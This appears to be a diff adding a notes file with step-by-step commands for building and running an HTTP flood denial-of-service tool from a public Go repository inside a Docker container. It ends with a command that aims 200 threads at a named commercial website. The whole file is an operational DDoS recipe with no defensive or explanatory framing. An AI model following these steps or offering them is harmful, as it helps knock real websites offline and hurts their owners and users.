@@ -1,0 +1,30 @@
+HTTP Flood or post ddos
+https://github.com/Leeon123/golang-httpflood
+
+# On Host
+docker pull ubuntu
+docker run -t -d --name busybox ubuntu
+docker exec -it busybox bash
+
+# On the container
+apt update && apt upgrade
+apt install golang-go
+
+apt-get install git
+apt-get install git-all
+
+apt-get install vim
+
+mkdir /root/golang
+cd /root/golang
+
+git clone https://github.com/Leeon123/golang-httpflood.git
+cd golang-httpflood
+go build httpflood.go
+
+
+ulimit -n 999999
+
+./httpflood  <url> <threads> <get/post> <seconds> <header.txt/nil>
+
+./httpflood https://www.softwareexpress.com.br 200 get 10 nil
